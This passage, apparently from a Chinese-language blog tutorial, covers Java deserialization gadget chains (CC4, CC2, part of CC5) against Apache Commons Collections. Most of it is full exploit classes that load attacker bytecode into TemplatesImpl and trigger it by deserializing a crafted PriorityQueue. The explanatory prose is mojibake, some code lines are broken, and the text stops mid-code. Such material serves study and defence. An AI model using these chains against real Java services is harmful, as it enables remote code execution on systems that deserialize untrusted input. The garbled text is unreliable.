<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-comment">// TransformingComparator.compare çš„ EXPpublic class ComparatorEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ”¹å®Œä¼šå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p><p><img src="/img/CompareError.png" alt="CompareError"></p><p>ç®€å•è¯´å°±æ˜¯è™½ç„¶é€šè¿‡<code>add</code>ç¡®ä¿äº†ä¼˜å…ˆé˜Ÿåˆ—é•¿åº¦ä¸º2ï¼Œä½†æ˜¯å¼•å‘äº†æ–°çš„é—®é¢˜ï¼š<code>add</code>ç›´æ¥è§¦å‘å®Œäº†è¿™æ¡é“¾å­ã€‚ä½†ä¹‹å‰é‚£æ¡<code>CC3</code>é“¾å­ä¸­æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>templates.newTransformer();<br></code></pre></td></tr></table></figure><p><code>_tfactory</code>è¿™ä¸œè¥¿è¢«<code>transient</code>ä¿®é¥°ä¸èƒ½ç»™ä»–èµ‹å€¼ï¼Œä¸è¿‡å¥½åœ¨<code>readObject</code>çš„æ—¶å€™ç»™ä»–å¤åˆ¶äº†æ‰€ä»¥è®©ä»–ä¸ä¸º<code>null</code>ã€‚è¿™é‡Œç›´æ¥è¶Šè¿‡äº†<code>readObject</code>ï¼Œæ‰€ä»¥ä¸º<code>null</code>ç›´æ¥æŠ¥é”™ã€‚</p><p>å¦‚æœæŠŠEXPæ”¹æˆè¿™æ ·å¯ä»¥ç›´æ¥å¼¹è®¡ç®—å™¨(ä½†è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œå› ä¸ºè¿˜æ²¡ååºåˆ—åŒ–)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br>       <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>       templates.newTransformer();  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(chainedTransformer)));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•å’Œå‰é¢ä¸€æ ·ï¼Œå…ˆæŠŠè¿™æ¡é“¾å­æ”¹æˆé”™çš„ï¼Œè®©ä»–<code>add</code>çš„æ—¶å€™åˆ«è§¦å‘è¿™æ¡é“¾å­ã€‚<code>add</code>å®Œäº†å†é€šè¿‡åå°„æ”¹å›å»å°±è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br><span class="hljs-comment">//        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);  </span><br><span class="hljs-comment">//        tfactoryField.setAccessible(true);  </span><br><span class="hljs-comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());  </span><br><span class="hljs-comment">//        templates.newTransformer();  </span><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//  instantiateTransformer.transform(TrAXFilter.class);  </span><br>  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <span class="hljs-comment">//è¿™é‡Œæœ¬åº”æ˜¯chainedTransformerï¼Œä½†æ”¹æˆäº†1</span><br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(<span class="hljs-number">1</span>);  <br> priorityQueue.add(<span class="hljs-number">2</span>);  <br>  <span class="hljs-comment">//æ”¹å®Œäº†å†é€šè¿‡åå°„æ”¹å›å»</span><br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, chainedTransformer);  <br>  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>CC2 è¿™æ¡é“¾å®é™…ä¸Šæ˜¯åœ¨ CC4 é“¾åŸºç¡€ä¸Šçš„ä¿®æ”¹ï¼Œç›®çš„æ˜¯é¿å…ä½¿ç”¨ <code>Transformer</code> æ•°ç»„ã€‚è¿™é‡Œå’Œ<code>CC4+CB1</code>é“¾å­æœ‰ç‚¹åƒï¼Œæˆ‘æ˜¯æ‡’ç‹—å°±ç›´æ¥æ”¾EXPäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Anything&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);  <br> <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));  <br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  <br> priorityQueue.add(templates);  <br> priorityQueue.add(templates);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br> transformingField.setAccessible(<span class="hljs-literal">true</span>);  <br> transformingField.set(transformingComparator, invokerTransformer);  <br> serialize(priorityQueue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>å…¥å£ç±»æ˜¯ <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> æ–¹æ³•ï¼š</p><p><img src="/img/CC51.png" alt="CC51"></p><p><code>TiedMapEntry</code> è¿™ä¸ªç±»å­˜åœ¨ <code>toString()</code> æ–¹æ³•ï¼š</p><p><img src="/img/CC52.png" alt="CC52"></p><p>ä¸€ç›´å¾ˆå¥½å¥‡è¿™ç§é“¾å­æ˜¯æ€ä¹ˆæ‰¾å‡ºæ¥çš„ã€‚ã€‚æ‹¿<code>toString()</code>è¿™ç§æ–¹æ³•æ¥è¯´ï¼Œç”¨æ³•å¯èƒ½æœ‰æˆç™¾ä¸Šåƒä¸ªï¼Œèƒ½åœ¨è¿™ä¹ˆå¤šç”¨æ³•ä¸­æ‰¾å‡ºèƒ½ç”¨çš„ä¹Ÿå¤ªåŠäº†</p><p>è°ƒç”¨äº†<code>getKey()</code>å’Œ<code>getValue()</code>æ–¹æ³•,<code>getValue()</code>æ–¹æ³•è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼š</p><p><img src="/img/CC53.png" alt="CC53"></p><p><code>map.get()</code>ï¼Œè¿™å°±å›åˆ°äº†<code>CC1</code>é‡Œ<code>Lazymap</code>é‚£æ¡é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// LazyMap ååŠæ®µçš„ EXPpublic class LazyMapGetEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title 